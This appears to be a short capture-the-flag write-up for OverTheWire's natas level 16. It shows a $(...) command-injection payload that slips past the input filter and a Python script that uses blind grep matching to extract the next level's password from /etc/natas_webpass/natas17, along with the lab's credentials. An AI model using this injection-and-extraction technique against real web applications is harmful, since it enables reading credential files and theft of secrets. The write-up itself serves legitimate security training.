# [natas 16](http://natas16.natas.labs.overthewire.org)

    Username: natas16
    Password: WaIHEacj63wnNIBROHeqi3p9t0m5nhmh

Like level 10, the input can't contain ";", "|", "&", "`", "\", "'", and """.
But we can still inject other command using $(command).

   $(grep -E ^a.*$ /etc/natas_webpass/natas17)hacker

Input the string above. If the password is start with a, there will be no output.
In this way, we can find out the password.
Similarly, write a python script to complete the work.

    import requests
    chars = [chr(i) for i in range(ord("a"),ord("z")+1)] +\
            [chr(i) for i in range(ord("A"),ord("Z")+1)] +\
            [chr(i) for i in range(ord("0"),ord("9")+1)]
    password = ''
    for i in range(64):
        for ch in chars:
            if 'hacker' not in requests.get('http://natas16.natas.labs.overthewire.org/?needle=$(grep -E ^'+password+ch+'.*$ /etc/natas_webpass/natas17)hacker&submit=Search', auth=('natas16','WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')).text:
                password += ch
                print(password)
                break
        else:
            break

We get the password.

    8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw

